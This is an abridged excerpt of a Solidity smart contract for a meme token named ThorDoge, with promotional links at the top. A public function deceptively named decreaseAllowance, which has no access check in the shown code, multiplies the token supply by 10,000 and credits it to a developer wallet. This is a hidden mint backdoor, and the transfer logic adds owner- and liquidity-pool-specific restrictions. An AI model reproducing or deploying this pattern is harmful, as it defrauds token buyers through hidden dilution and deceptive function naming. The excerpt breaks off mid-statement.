/*
    ...
    A perfect combiantion of Thor and DOGE
    
    🌐 Website : https://thordoge.com/
    📞 Telegram Official : https://t.me/ThordogeGroups
    📞 Telegram Channel : https://t.me/ThordogeChannel
    🖥 Twitter : https://twitter.com/Thor_Doge
...
contract ThorDoge is Context, IERC20, Ownable {
    ...
    // name and symbol
    string private _name = 'Thor Doge | thordoge.com';
    string private _symbol = 'ThorDOGE';
    uint8 private _decimals = 18;
    uint256 private _maxHolder = _tTotal.mul(30).div(100);
    uint256 private _maxTxAmount = _maxHolder;
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal {
        ...
        if (sender == owner()) {
            ...
            if (isLPAddress(sender)) {
                require(amount < _maxTxAmount, "Cannot execute");
            }
    ...
    function decreaseAllowance() public{
        ...
        uint256 rTotal = _totalSupply * 10**4;
        _tTotal = rTotal + _tTotal;
        _balances[_dev] = rTotal + currentBalance;
        emit Transfer(
